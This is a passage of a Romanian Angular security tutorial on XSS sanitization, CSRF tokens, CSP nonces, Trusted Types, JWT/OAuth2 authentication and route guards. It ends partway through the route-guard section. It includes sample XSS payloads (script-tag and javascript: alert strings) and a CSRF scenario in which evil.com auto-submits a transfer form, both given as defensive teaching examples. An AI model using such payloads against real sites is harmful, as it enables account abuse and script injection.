# 07. Securitate in Angular

## Cuprins

1. [XSS Prevention](#1-xss-prevention)
2. [CSRF Protection](#2-csrf-protection)
3. [Content Security Policy (CSP) si Trusted Types](#3-content-security-policy-csp-si-trusted-types)
4. [Autentificare](#4-autentificare)
5. [Route Guards](#5-route-guards-functional-guards-in-modern-angular)
6. [HTTP Interceptors pentru securitate](#6-http-interceptors-pentru-securitate)
7. [HttpOnly cookies vs localStorage](#7-httponly-cookies-vs-localstorage)
8. [OWASP Top 10 pentru Angular](#8-owasp-top-10-pentru-angular)
9. [Dependency Auditing](#9-dependency-auditing)

---

## 1. XSS Prevention

**Cross-Site Scripting (XSS)** este una dintre cele mai frecvente vulnerabilitati web. Angular ofera protectie **by default** prin sanitizarea automata a valorilor interpolate in template-uri.

### Sanitizarea automata a Angular

Angular trateaza **toate valorile ca untrusted by default**. Cand o valoare este inserata in DOM prin data binding (`{{ }}`, `[innerHTML]`, `[href]`), Angular o sanitizeaza automat in functie de contextul in care este folosita.

```typescript
@Component({
  selector: 'app-comment',
  template: `
    <!-- Angular sanitizeaza automat - script-ul NU se executa -->
    <p>{{ userComment }}</p>

    <!-- innerHTML este si el sanitizat automat -->
    <div [innerHTML]="userHtml"></div>

    <!-- Atributele URL sunt validate automat -->
    <a [href]="userLink">Link</a>

    <!-- Style bindings sunt sanitizate -->
    <div [style.background]="userBackground"></div>
  `
})
export class CommentComponent {
  // Daca userComment = '<script>alert("xss")</script>'
  // Angular il va afisa ca text, NU il va executa
  userComment = '<script>alert("xss")</script>';

  // innerHTML va fi sanitizat - tag-urile periculoase sunt eliminate
  userHtml = '<b>Bold</b><script>alert("xss")</script>';
  // Rezultat: '<b>Bold</b>' (script-ul este eliminat)

  userLink = 'javascript:alert("xss")';
  // Rezultat: 'unsafe:javascript:alert("xss")' (prefixat cu unsafe:)

  userBackground = 'url(javascript:alert("xss"))';
  // Rezultat: valoarea este eliminata
}
```

### SecurityContext si DomSanitizer

Angular defineste patru contexte de securitate, fiecare cu reguli de sanitizare specifice:

```typescript
// Din @angular/core
enum SecurityContext {
  NONE = 0,      // Nu se aplica sanitizare
  HTML = 1,      // Sanitizare HTML (elimina script, event handlers)
  STYLE = 2,     // Sanitizare CSS (elimina url(), expression())
  URL = 3,       // Sanitizare URL (blocheaza javascript:, data:)
  RESOURCE_URL = 4  // Sanitizare stricta URL resurse (iframe src, script src)
}
```

**DomSanitizer** este serviciul care realizeaza sanitizarea:

```typescript
import { DomSanitizer, SafeHtml, SafeUrl, SafeStyle, SafeResourceUrl } from '@angular/platform-browser';

@Component({
  selector: 'app-sanitizer-demo',
  template: `
    <div [innerHTML]="trustedHtml"></div>
    <iframe [src]="trustedVideoUrl"></iframe>
    <div [style.background-image]="trustedStyle"></div>
  `
})
export class SanitizerDemoComponent {
  trustedHtml: SafeHtml;
  trustedVideoUrl: SafeResourceUrl;
  trustedStyle: SafeStyle;

  private sanitizer = inject(DomSanitizer);

  constructor() {
    // Sanitizare manuala - returneaza string sanitizat
    const cleanHtml = this.sanitizer.sanitize(SecurityContext.HTML, dirtyHtml);
    console.log(cleanHtml); // HTML curat, fara elemente periculoase

    // Sanitizare URL
    const cleanUrl = this.sanitizer.sanitize(SecurityContext.URL, userUrl);
    console.log(cleanUrl); // URL valid sau null daca e periculos
  }
}
```

### bypassSecurityTrust*() - Cand si cum

Metodele `bypassSecurityTrust*()` permit **marcarea explicita** a unei valori ca sigura, ocolind sanitizarea automata. **Trebuie folosite cu extrema precautie.**

```typescript
@Component({
  selector: 'app-trusted-content',
  template: `
    <div [innerHTML]="safeHtml"></div>
    <iframe [src]="safeVideoUrl" width="560" height="315"></iframe>
    <a [href]="safeLink">Download</a>
    <div [style]="safeStyle"></div>
  `
})
export class TrustedContentComponent {
  safeHtml: SafeHtml;
  safeVideoUrl: SafeResourceUrl;
  safeLink: SafeUrl;
  safeStyle: SafeStyle;

  private sanitizer = inject(DomSanitizer);

  ngOnInit(): void {
    // RESOURCE_URL - necesar pentru iframe src, script src, link href
    // ATENTIE: Doar pentru URL-uri pe care le controlam noi!
    this.safeVideoUrl = this.sanitizer.bypassSecurityTrustResourceUrl(
      'https://www.youtube.com/embed/VIDEO_ID'
    );

    // HTML - pentru continut HTML complex de la o sursa de incredere
    // ATENTIE: Niciodata cu input de la utilizator nesanitizat!
    this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(
      '<div class="custom-widget"><h3>Titlu</h3><p>Continut sigur</p></div>'
    );

    // URL - pentru link-uri cu scheme custom
    this.safeLink = this.sanitizer.bypassSecurityTrustUrl(
      'data:application/pdf;base64,JVBERi...'
    );

    // STYLE - pentru stiluri dinamice complexe
    this.safeStyle = this.sanitizer.bypassSecurityTrustStyle(
      'background-image: url(https://cdn.example.com/bg.png)'
    );
  }
}
```

**Reguli pentru utilizarea bypass:**
- Niciodata cu date direct de la utilizator
- Doar cu valori pe care le controlam sau le-am validat riguros
- Preferabil: crearea unui Pipe reutilizabil cu validare incorporata

```typescript
// Pipe sigur pentru URL-uri YouTube
@Pipe({ name: 'safeYoutubeUrl', standalone: true })
export class SafeYoutubeUrlPipe implements PipeTransform {
  private sanitizer = inject(DomSanitizer);

  transform(videoId: string): SafeResourceUrl {
    // Validare stricta a ID-ului video
    if (!/^[a-zA-Z0-9_-]{11}$/.test(videoId)) {
      throw new Error(`Invalid YouTube video ID: ${videoId}`);
    }
    const url = `https://www.youtube.com/embed/${videoId}`;
    return this.sanitizer.bypassSecurityTrustResourceUrl(url);
  }
}

// Utilizare in template:
// <iframe [src]="videoId | safeYoutubeUrl"></iframe>
```

### Ce sa NU faci niciodata

```typescript
// ❌ NICIODATA nu folosi document.write
document.write('<div>' + userInput + '</div>'); // XSS garantat

// ❌ NICIODATA nu folosi eval()
eval(userProvidedCode); // Executie arbitrara de cod

// ❌ NICIODATA nu folosi innerHTML nativ (fara Angular)
document.getElementById('output')!.innerHTML = userInput; // XSS

// ❌ NICIODATA nu construi HTML manual cu concatenare
const html = '<a href="' + userUrl + '">Click</a>'; // XSS prin atribut

// ❌ NICIODATA nu dezactiva sanitizarea pentru input de la utilizator
this.sanitizer.bypassSecurityTrustHtml(userInput); // PERICOL MAXIM

// ❌ NICIODATA nu folosi ElementRef.nativeElement pentru manipulare DOM directa
this.elementRef.nativeElement.innerHTML = userInput; // Ocoleste sanitizarea

// ✅ In schimb, foloseste binding-urile Angular
// Template: <div [innerHTML]="userInput"></div>
// Angular sanitizeaza automat
```

### Server-Side Rendering (SSR) si XSS

In contextul Angular Universal / SSR, sanitizarea functioneaza diferit:

```typescript
// Pe server, Angular foloseste un sanitizer diferit
// care poate fi mai restrictiv.
// Asigurati-va ca testati si pe server, nu doar in browser.

// Pentru Angular 17+ cu @angular/ssr:
// Sanitizarea este consistenta intre server si client,
// dar atentie la hydration mismatch daca sanitizarea
// produce rezultate diferite.
```

---

## 2. CSRF Protection

**Cross-Site Request Forgery (CSRF/XSRF)** este un atac in care un site malitios face cereri catre API-ul vostru folosind cookie-urile existente ale utilizatorului autentificat.

### Cum functioneaza CSRF

```
1. Utilizatorul se autentifica pe app.example.com
2. Browser-ul stocheaza cookie-ul de sesiune
3. Utilizatorul viziteaza evil.com
4. evil.com contine: <form action="https://app.example.com/api/transfer" method="POST">
5. Formularul se trimite automat cu cookie-urile existente
6. Server-ul nu poate distinge cererea legitima de cea malitioasa
```

### Protectia Angular XSRF (Double Submit Cookie Pattern)

Angular HttpClient suporta nativ **double submit cookie pattern**:

1. Server-ul seteaza un cookie `XSRF-TOKEN` la fiecare raspuns
2. Angular citeste acest cookie si il trimite ca header `X-XSRF-TOKEN`
3. Server-ul verifica ca valoarea header-ului corespunde cookie-ului
4. Un site extern nu poate citi cookie-ul (Same-Origin Policy), deci nu poate seta header-ul

#### Configurare cu provideHttpClient (Angular 15+, abordare moderna)

```typescript
// app.config.ts
import { ApplicationConfig } from '@angular/core';
import { provideHttpClient, withXsrfConfiguration } from '@angular/common/http';

export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withXsrfConfiguration({
        cookieName: 'XSRF-TOKEN',    // default - numele cookie-ului
        headerName: 'X-XSRF-TOKEN'   // default - numele header-ului
      })
    )
  ]
};
```

#### Configurare cu HttpClientXsrfModule (abordare clasica, pre-standalone)

```typescript
// app.module.ts
@NgModule({
  imports: [
    HttpClientModule,
    HttpClientXsrfModule.withOptions({
      cookieName: 'MY-XSRF-TOKEN',    // nume custom cookie
      headerName: 'X-MY-XSRF-TOKEN'   // nume custom header
    })
  ]
})
export class AppModule {}
```

**Important:** Angular adauga automat header-ul XSRF doar pentru:
- Cereri **mutative** (POST, PUT, DELETE, PATCH)
- Cereri catre **acelasi origin** (same-origin)
- NU pentru cereri GET sau HEAD (sunt considerate safe)

### Interceptor CSRF custom

Cand backend-ul foloseste un mecanism diferit de CSRF:

```typescript
// csrf.interceptor.ts
import { HttpInterceptorFn } from '@angular/common/http';
import { inject } from '@angular/core';

// Serviciu care gestioneaza token-ul CSRF
@Injectable({ providedIn: 'root' })
export class CsrfTokenService {
  private token: string | null = null;

  setToken(token: string): void {
    this.token = token;
  }

  getToken(): string | null {
    return this.token;
  }
}

// Interceptor functional
export const csrfInterceptor: HttpInterceptorFn = (req, next) => {
  const csrfService = inject(CsrfTokenService);
  const token = csrfService.getToken();

  // Adauga token-ul doar pentru cereri mutative
  const isMutatingRequest = ['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method);

  if (token && isMutatingRequest) {
    const clonedReq = req.clone({
      setHeaders: {
        'X-CSRF-Token': token
      }
    });
    return next(clonedReq);
  }

  return next(req);
};

// Interceptor care extrage token-ul din raspunsuri
export const csrfExtractorInterceptor: HttpInterceptorFn = (req, next) => {
  const csrfService = inject(CsrfTokenService);

  return next(req).pipe(
    tap(event => {
      if (event instanceof HttpResponse) {
        const csrfToken = event.headers.get('X-CSRF-Token');
        if (csrfToken) {
          csrfService.setToken(csrfToken);
        }
      }
    })
  );
};

// Inregistrare
export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withInterceptors([csrfExtractorInterceptor, csrfInterceptor])
    )
  ]
};
```

### Configurare Server-Side (exemplu Express.js)

```typescript
// server-side - pentru referinta
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(csrf({
  cookie: {
    httpOnly: false,  // Angular trebuie sa poata citi cookie-ul
    secure: true,     // Doar HTTPS
    sameSite: 'strict'
  }
}));

// Middleware care seteaza cookie-ul XSRF
app.use((req, res, next) => {
  res.cookie('XSRF-TOKEN', req.csrfToken(), {
    httpOnly: false,  // Must be readable by Angular
    secure: true,
    sameSite: 'strict'
  });
  next();
});
```

### SameSite Cookies - Protectie aditionala

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

- **Strict**: Cookie-ul nu este trimis deloc in cereri cross-site
- **Lax** (default in browsere moderne): Cookie-ul este trimis doar pentru navigare top-level GET
- **None**: Cookie-ul este trimis mereu (necesita Secure)

---

## 3. Content Security Policy (CSP) si Trusted Types

### Ce este CSP si de ce conteaza

**Content Security Policy** este un header HTTP care instruieste browser-ul sa restrictioneze sursele din care poate incarca resurse (scripturi, stiluri, imagini etc.). Este **ultima linie de aparare** impotriva XSS.

```
Content-Security-Policy: default-src 'self';
                         script-src 'self' 'nonce-abc123';
                         style-src 'self' 'nonce-abc123';
                         img-src 'self' https://cdn.example.com;
                         connect-src 'self' https://api.example.com;
                         font-src 'self' https://fonts.googleapis.com;
                         object-src 'none';
                         base-uri 'self';
                         frame-ancestors 'none';
```

**Directive principale:**
- `default-src` - fallback pentru toate directivele nespecificate
- `script-src` - surse permise pentru JavaScript
- `style-src` - surse permise pentru CSS
- `img-src` - surse permise pentru imagini
- `connect-src` - surse permise pentru XHR, WebSocket, fetch
- `frame-ancestors` - cine poate incadra pagina in iframe (inlocuieste X-Frame-Options)
- `object-src` - surse pentru `<object>`, `<embed>`, `<applet>` (recomandat: 'none')

### Angular si CSP cu Nonce

Angular genereaza stiluri inline pentru componentele cu `ViewEncapsulation.Emulated` (default). Fara configurare, CSP va bloca aceste stiluri. Solutia: **nonce-based CSP**.

```typescript
// Angular 16+ - CSP_NONCE injection token
// main.ts sau app.config.ts
import { CSP_NONCE } from '@angular/core';

// Varianta 1: Nonce generat pe server si injectat in HTML
// Server-ul genereaza un nonce unic per cerere si il pune in HTML:
// <html>
//   <head>
//     <meta name="csp-nonce" content="RANDOM_NONCE_VALUE">
//   </head>
// </html>

// Citim nonce-ul din DOM
const nonceElement = document.querySelector('meta[name="csp-nonce"]');
const nonce = nonceElement?.getAttribute('content') ?? '';

// Il furnizam Angular-ului
bootstrapApplication(AppComponent, {
  providers: [
    { provide: CSP_NONCE, useValue: nonce }
  ]
});
```

```typescript
// Varianta 2: Nonce pe atributul ngCspNonce (Angular 16+)
// In index.html, server-ul injecteaza nonce-ul:
// <app-root ngCspNonce="RANDOM_NONCE_VALUE"></app-root>

// Angular va folosi automat acest nonce pentru stilurile inline.
// NU este nevoie de configurare aditionala in TypeScript.
```

```typescript
// Configurare server (Express.js) pentru generarea nonce-ului
import crypto from 'crypto';

app.use((req, res, next) => {
  // Genereaza un nonce criptografic unic per cerere
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  // Seteaza header-ul CSP cu nonce-ul
  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.example.com`,
    `font-src 'self' https://fonts.googleapis.com`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `frame-ancestors 'none'`
  ].join('; '));

  next();
});

// In template-ul index.html, server-ul injecteaza nonce-ul:
// <app-root ngCspNonce="<%= nonce %>"></app-root>
```

**Nota importanta:** `'unsafe-inline'` in `script-src` **anuleaza complet** protectia CSP impotriva XSS. Folositi **nonce** sau **hash** in locul `'unsafe-inline'`.

### Trusted Types pentru prevenirea DOM XSS

**Trusted Types** este un API al browser-ului care previne DOM XSS prin interzicerea string-urilor in sink-uri periculoase (innerHTML, eval, etc.) si cererea de obiecte "trusted" in loc.

```typescript
// Activarea Trusted Types prin CSP header
// Content-Security-Policy: trusted-types angular; require-trusted-types-for 'script'

// Angular suporta Trusted Types nativ incepand cu v14.
// Cand Trusted Types este activat, Angular foloseste automat
// politica 'angular' pentru a crea valori trusted.

// Orice cod care incearca sa scrie direct in innerHTML
// va fi blocat de browser daca nu foloseste o politica trusted types.
```

```typescript
// Crearea unei politici custom Trusted Types (pentru cod non-Angular)
// Util cand avem biblioteci third-party care manipuleaza DOM-ul
if (window.trustedTypes) {
  const policy = window.trustedTypes.createPolicy('myApp', {
    createHTML: (input: string) => {
      // Sanitizare custom inainte de a permite HTML
      return DOMPurify.sanitize(input);
    },
    createScriptURL: (input: string) => {
      // Permite doar URL-uri de la CDN-ul nostru
      const url = new URL(input);
      if (url.hostname === 'cdn.example.com') {
        return input;
      }
      throw new Error(`Untrusted script URL: ${input}`);
    },
    createScript: (input: string) => {
      // De obicei, nu permitem niciodata crearea de scripturi dinamice
      throw new Error('Dynamic script creation is not allowed');
    }
  });
}
```

### Exemplu complet de headere de securitate

```
# Toate headerele de securitate recomandate
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; style-src 'self' 'nonce-{RANDOM}'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; font-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests; require-trusted-types-for 'script'; trusted-types angular
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## 4. Autentificare

### JWT (JSON Web Tokens)

#### Structura JWT

Un JWT are trei parti, separate prin `.`:

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    <-- Header (Base64URL)
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.  <-- Payload (Base64URL)
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c       <-- Signature
```

```typescript
// Header - algoritmul de semnare si tipul
{
  "alg": "RS256",  // RSA + SHA-256 (asimetric, recomandat)
  "typ": "JWT"
}

// Payload - claims (date)
{
  "sub": "user-id-123",          // Subject (ID utilizator)
  "email": "user@example.com",   // Claim custom
  "roles": ["admin", "editor"],  // Claim custom
  "iat": 1700000000,             // Issued At
  "exp": 1700003600,             // Expiration (1 ora)
  "iss": "https://auth.example.com",  // Issuer
  "aud": "https://app.example.com"    // Audience
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

#### Fluxul JWT in Angular

```
1. Client trimite credentiale (email + parola) -> POST /auth/login
2. Server valideaza, genereaza access token + refresh token
3. Client stocheaza token-urile
4. Client trimite access token in header: Authorization: Bearer <token>
5. Server valideaza token-ul la fiecare cerere
6. Cand access token expira, client foloseste refresh token -> POST /auth/refresh
7. Server returneaza un nou access token (+ optional nou refresh token)
```

#### Serviciul de autentificare

```typescript
// auth.models.ts
export interface LoginCredentials {
  email: string;
  password: string;
}

export interface AuthTokens {
  accessToken: string;
  refreshToken: string;
}

export interface TokenPayload {
  sub: string;
  email: string;
  roles: string[];
  exp: number;
  iat: number;
}

export interface User {
  id: string;
  email: string;
  roles: string[];
}
```

```typescript
// auth.service.ts
import { Injectable, inject, signal, computed } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Router } from '@angular/router';
import { Observable, tap, catchError, throwError, BehaviorSubject } from 'rxjs';

@Injectable({ providedIn: 'root' })
export class AuthService {
  private http = inject(HttpClient);
  private router = inject(Router);
  private readonly API_URL = '/api/auth';

  // Signals pentru starea de autentificare (Angular 16+)
  private currentUserSignal = signal<User | null>(null);
  readonly currentUser = this.currentUserSignal.asReadonly();
  readonly isAuthenticated = computed(() => this.currentUserSignal() !== null);
  readonly userRoles = computed(() => this.currentUserSignal()?.roles ?? []);

  // Access token stocat IN MEMORIE (nu in localStorage!)
  private accessToken: string | null = null;

  // Flag pentru refresh in progress (previne cereri multiple de refresh)
  private isRefreshing = false;
  private refreshTokenSubject = new BehaviorSubject<string | null>(null);

  constructor() {
    // La pornirea aplicatiei, incercam sa obtinem un nou token
    // folosind refresh token-ul din HttpOnly cookie
    this.tryAutoLogin();
  }

  login(credentials: LoginCredentials): Observable<AuthTokens> {
    return this.http.post<AuthTokens>(`${this.API_URL}/login`, credentials, {
      withCredentials: true  // Trimite si primeste cookies (refresh token)
    }).pipe(
      tap(tokens => this.handleAuthSuccess(tokens)),
      catchError(error => {
        console.error('Login failed:', error);
        return throwError(() => error);
      })
    );
  }

  logout(): void {
    // Invalideaza refresh token-ul pe server
    this.http.post(`${this.API_URL}/logout`, {}, {
      withCredentials: true
    }).subscribe({
      complete: () => this.handleLogout()
    });
  }

  refreshAccessToken(): Observable<AuthTokens> {
    // Refresh token-ul este trimis automat ca HttpOnly cookie
    return this.http.post<AuthTokens>(`${this.API_URL}/refresh`, {}, {
      withCredentials: true
    }).pipe(
      tap(tokens => this.handleAuthSuccess(tokens)),
      catchError(error => {
        this.handleLogout();
        return throwError(() => error);
      })
    );
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }

  hasRole(role: string): boolean {
    return this.userRoles().includes(role);
  }

  hasAnyRole(roles: string[]): boolean {
    return roles.some(role => this.userRoles().includes(role));
  }

  private handleAuthSuccess(tokens: AuthTokens): void {
    // Stocam access token-ul DOAR in memorie
    this.accessToken = tokens.accessToken;

    // Refresh token-ul este stocat automat ca HttpOnly cookie de server
    // NU il stocam in client-side JavaScript

    // Decodam payload-ul pentru informatii despre utilizator
    const payload = this.decodeToken(tokens.accessToken);
    if (payload) {
      this.currentUserSignal.set({
        id: payload.sub,
        email: payload.email,
        roles: payload.roles
      });
    }

    // Programam refresh-ul automat inainte de expirare
    this.scheduleTokenRefresh(payload);
  }

  private handleLogout(): void {
    this.accessToken = null;
    this.currentUserSignal.set(null);
    this.router.navigate(['/login']);
  }

  private decodeToken(token: string): TokenPayload | null {
    try {
      const payload = token.split('.')[1];
      const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
      return JSON.parse(decoded);
    } catch {
      return null;
    }
  }

  private scheduleTokenRefresh(payload: TokenPayload | null): void {
    if (!payload) return;

    const expiresIn = payload.exp * 1000 - Date.now();
    // Refresh cu 60 secunde inainte de expirare
    const refreshIn = Math.max(expiresIn - 60_000, 0);

    setTimeout(() => {
      this.refreshAccessToken().subscribe();
    }, refreshIn);
  }

  private tryAutoLogin(): void {
    this.refreshAccessToken().subscribe({
      error: () => {
        // Nu avem refresh token valid - utilizatorul trebuie sa se logheze
        console.log('No valid session found');
      }
    });
  }
}
```

### OAuth2 / OpenID Connect

```typescript
// Fluxul Authorization Code cu PKCE (recomandat pentru SPA)
//
// 1. Client genereaza code_verifier (random) si code_challenge (SHA-256 hash)
// 2. Client redirecteaza utilizatorul catre Authorization Server
// 3. Utilizatorul se autentifica si autorizeaza
// 4. Authorization Server redirecteaza inapoi cu authorization code
// 5. Client schimba code + code_verifier pentru tokens
// 6. Authorization Server verifica code_challenge si returneaza tokens

// oauth.service.ts
@Injectable({ providedIn: 'root' })
export class OAuthService {
  private readonly AUTH_URL = 'https://auth.example.com';
  private readonly CLIENT_ID = 'my-angular-app';
  private readonly REDIRECT_URI = 'https://app.example.com/callback';

  async initiateLogin(): Promise<void> {
    // Generam PKCE challenge
    const codeVerifier = this.generateCodeVerifier();
    const codeChallenge = await this.generateCodeChallenge(codeVerifier);
    const state = this.generateState();

    // Stocam temporar (necesare la callback)
    sessionStorage.setItem('pkce_code_verifier', codeVerifier);
    sessionStorage.setItem('oauth_state', state);

    // Construim URL-ul de autorizare
    const params = new URLSearchParams({
      response_type: 'code',
      client_id: this.CLIENT_ID,
      redirect_uri: this.REDIRECT_URI,
      scope: 'openid profile email',
      state: state,
      code_challenge: codeChallenge,
      code_challenge_method: 'S256'
    });

    // Redirectam utilizatorul
    window.location.href = `${this.AUTH_URL}/authorize?${params}`;
  }

  async handleCallback(code: string, state: string): Promise<void> {
    // Verificam state-ul (protectie CSRF)
    const savedState = sessionStorage.getItem('oauth_state');
    if (state !== savedState) {
      throw new Error('Invalid state parameter - possible CSRF attack');
    }

    const codeVerifier = sessionStorage.getItem('pkce_code_verifier');

    // Schimbam codul pentru tokens
    const tokens = await firstValueFrom(
      this.http.post<AuthTokens>(`${this.AUTH_URL}/token`, {
        grant_type: 'authorization_code',
        code,
        redirect_uri: this.REDIRECT_URI,
        client_id: this.CLIENT_ID,
        code_verifier: codeVerifier
      })
    );

    // Curatam datele temporare
    sessionStorage.removeItem('pkce_code_verifier');
    sessionStorage.removeItem('oauth_state');

    // Procesam token-urile
    this.authService.handleOAuthTokens(tokens);
  }

  private generateCodeVerifier(): string {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return this.base64UrlEncode(array);
  }

  private async generateCodeChallenge(verifier: string): Promise<string> {
    const encoder = new TextEncoder();
    const data = encoder.encode(verifier);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return this.base64UrlEncode(new Uint8Array(hash));
  }

  private generateState(): string {
    const array = new Uint8Array(16);
    crypto.getRandomValues(array);
    return this.base64UrlEncode(array);
  }

  private base64UrlEncode(buffer: Uint8Array): string {
    return btoa(String.fromCharCode(...buffer))
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  }
}
```

### Token Refresh Strategies

```typescript
// Strategia 1: Refresh proactiv (recomandat)
// Refresh-ul se face INAINTE de expirarea token-ului

// Strategia 2: Refresh reactiv cu queue
// Cand o cerere primeste 401, se face refresh si se retrimite cererea
// Toate cererile concurente asteapta acelasi refresh

// Implementarea este in auth.interceptor.ts (vezi sectiunea HTTP Interceptors)
```

### Interceptor complet pentru autentificare

```typescript
// auth.interceptor.ts
import { HttpInterceptorFn, HttpErrorResponse } from '@angular/common/http';
import { inject } from '@angular/core';
import { catchError, switchMap, filter, take, throwError } from 'rxjs';

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const authService = inject(AuthService);

  // Nu adaugam token pentru cererile de auth
  if (isAuthRequest(req.url)) {
    return next(req);
  }

  // Adaugam access token-ul
  const token = authService.getAccessToken();
  const authReq = token ? addToken(req, token) : req;

  return next(authReq).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401 && !isAuthRequest(req.url)) {
        return handle401Error(req, next, authService);
      }
      return throwError(() => error);
    })
  );
};

function addToken(req: any, token: string) {
  return req.clone({
    setHeaders: {
      Authorization: `Bearer ${token}`
    }
  });
}

function isAuthRequest(url: string): boolean {
  return url.includes('/auth/login') ||
         url.includes('/auth/refresh') ||
         url.includes('/auth/register');
}

// Gestionarea 401 cu refresh si retry
let isRefreshing = false;
let refreshComplete$ = new BehaviorSubject<boolean>(false);

function handle401Error(req: any, next: any, authService: AuthService) {
  if (!isRefreshing) {
    isRefreshing = true;
    refreshComplete$.next(false);

    return authService.refreshAccessToken().pipe(
      switchMap(tokens => {
        isRefreshing = false;
        refreshComplete$.next(true);
        return next(addToken(req, tokens.accessToken));
      }),
      catchError(error => {
        isRefreshing = false;
        authService.logout();
        return throwError(() => error);
      })
    );
  }

  // Daca refresh-ul este deja in progress, asteptam sa se termine
  return refreshComplete$.pipe(
    filter(complete => complete),
    take(1),
    switchMap(() => {
      const token = authService.getAccessToken();
      return next(addToken(req, token!));
    })
  );
}
```

---

## 5. Route Guards (Functional Guards in Modern Angular)

Incepand cu Angular 15+, guards sunt **functii simple** in loc de clase. Aceasta abordare este mai concisa, mai testabila si mai compozabila.

### CanActivateFn

Protejeaza ruta - previne navigarea daca conditia nu este indeplinita.

```typescript
// auth.guard.ts
import { CanActivateFn, Router } from '@angular/router';
import { inject } from '@angular/core';

export const authGuard: CanActivateFn = (route, state) => {
  const authService = inject(AuthService);
  const router = inject(Router);

  if (authService.isAuthenticated()) {
    return true;
  }

  // Salvam URL-ul cerut pentru redirect dupa login
  router.navigate(['/login'], {
    queryParams: { returnUrl: state.url }
  });
  return false;
};

// Guard cu verificare de rol
export const roleGuard: CanActivateFn = (route, state) => {
  const authService = inject(AuthService);
  const router = inject(Router);

  const requiredRoles = route.data['roles'] as string[];

  if (!authService.isAuthenticated()) {
    router.navigate(['/login'], { queryParams: { returnUrl: state.url } });
    return false;
  }

  if (!requiredRoles || requiredRoles.length === 0) {
    return true;
  }

  if (authService.hasAnyRole(requiredRoles)) {
    return true;
  }

  // Utilizatorul este autentificat dar nu are rolul necesar
  router.navigate(['/unauthorized']);
  return false;
};

// Guard async (verifica token-ul pe server)
export const tokenValidationGuard: CanActivateFn = (route, state) => {
  const authService = inject(AuthService);
  const router = inject(Router);

  return authService.validateToken().pipe(
    map(isValid => {
      if (!isValid) {
        router.navigate(['/login']);
        return false;
      }
      return true;
    }),
    catchError(() => {
      router.navigate(['/login']);
      return of(false);
    })
  );
};
```

### CanDeactivateFn

Previne parasirea rutei (ex: formular cu modificari nesalvate).

```typescript
// unsaved-changes.guard.ts
export interface HasUnsavedChanges {
  hasUnsavedChanges(): boolean;
}

export const unsavedChangesGuard: CanDeactivateFn<HasUnsavedChanges> = (
  component,
  currentRoute,
  currentState,
  nextState
) => {
  if (component.hasUnsavedChanges()) {
    return confirm(
      'Aveti modificari nesalvate. Sigur doriti sa parasiti pagina?'
    );
  }
  return true;
};

// Utilizare in componenta
@Component({
  selector: 'app-edit-form',
  template: `
    <form [formGroup]="form">
      <input formControlName="name" />
      <button (click)="save()">Salvare</button>
    </form>
  `
})
export class EditFormComponent implements HasUnsavedChanges {
  form = inject(FormBuilder).group({
    name: ['']
  });

  private saved = false;

  hasUnsavedChanges(): boolean {
    return this.form.dirty && !this.saved;
  }

  save(): void {
    // ... salvare
    this.saved = true;
  }
}
```

### CanMatchFn (inlocuieste CanLoad)

Controleaza daca o ruta poate fi **potrivita** (matched). Util pentru lazy loading conditionat si rute alternative bazate pe rol.

```typescript
// can-match-admin.guard.ts
export const canMatchAdmin: CanMatchFn = (route, segments) => {
  const authService = inject(AuthService);
  return authService.hasRole('admin');
};

export const canMatchUser: CanMatchFn = (route, segments) => {
  const authService = inject(AuthService);
  return authService.isAuthenticated();
};

// Utilizare in rutare - aceeasi cale, module diferite bazate pe rol
const routes: Routes = [
  {
    path: 'dashboard',
    canMatch: [canMatchAdmin],
    loadComponent: () => import('./admin/admin-dashboard.component')
      .then(m => m.AdminDashboardComponent)
  },
  {
    path: 'dashboard',
    canMatch: [canMatchUser],
    loadComponent: () => import('./user/user-dashboard.component')
      .then(m => m.UserDashboardComponent)
  },
  {
    path: 'dashboard',
    // Fallback pentru utilizatori neautentificati
    redirectTo: '/login',
    pathMatch: 'full'
  }
];
```

**Diferenta CanMatch vs CanActivate:**
- `CanMatch` determina daca ruta **se potriveste** (matching phase) - permite rute alternative
- `CanActivate` se executa **dupa** potrivirea rutei - blocheaza sau permite navigarea
- `CanMatch` previne si **preloading-ul** modulului lazy-loaded daca returneaza false

### Resolve

Incarca date **inainte** de activarea rutei.

```typescript
// user-resolver.ts
import { ResolveFn } from '@angular/router';

export const userResolver: ResolveFn<User> = (route, state) => {
  const userService = inject(UserService);
  const userId = route.paramMap.get('id')!;

  return userService.getUser(userId).pipe(
    catchError(error => {
      const router = inject(Router);
      router.navigate(['/not-found']);
      return EMPTY;
    })
  );
};

// Configurare ruta
const routes: Routes = [
  {
    path: 'users/:id',
    component: UserDetailComponent,
    resolve: {
      user: userResolver
    }
